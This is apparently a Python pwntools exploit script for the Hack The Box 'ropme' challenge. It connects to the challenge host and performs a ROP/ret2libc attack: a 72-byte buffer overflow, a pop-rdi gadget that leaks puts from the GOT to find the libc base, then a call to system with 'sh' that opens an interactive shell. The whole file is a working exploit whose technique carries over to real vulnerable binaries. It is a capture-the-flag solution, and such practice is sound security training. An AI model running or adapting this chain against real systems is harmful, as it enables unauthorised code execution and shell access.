#!/usr/bin/python

'''
    ropme
    @Author: Lorenzo Invidia
    @Requirements: pwntools
'''

import os
from pwn import *

e = ELF('./ropme')

#r = process(e.path)
r = remote("docker.hackthebox.eu", 31148)

context(os="linux", arch="amd64")
context.log_level = 'DEBUG'

junk = 'A'*72                           # offset
gg1 = 0x4006d3                          # pop rdi ; ret
puts = e.symbols['puts']                # puts
puts_got = e.got['puts']                # puts ptr in got
main = e.symbols['main']                # main
sh = 0x40038f                           # sh from 'flush'
puts_off = 0x06f690                     # libc.so puts offset
system_off = 0x045390                   # libc.so system offset

def leak(addr):
    payload = junk
    payload += p64(gg1)                 # pop rdi;ret
    payload += p64(puts_got)            # address to print
    payload += p64(addr)                # call addr
    payload += p64(main)                # loop to main
    r.recvuntil('dah?\n')
    r.sendline(payload)
    return u64(r.recvline().strip().ljust(8, "\x00"))

def pwn(addr):
    payload = junk
    payload += p64(gg1)                 # pop rdi;ret
    payload += p64(sh)                  # sh
    payload += p64(addr)                # call addr
    r.sendline(payload)

libc_puts = leak(puts)
r.recvuntil('dah?\n')
libc_base = libc_puts - puts_off
log.success("leaked libc puts: " + format(hex(libc_puts)))
log.success("leaked libc base: " + format(hex(libc_base)))
libc_system = libc_base + system_off

pwn(libc_system)
r.interactive()
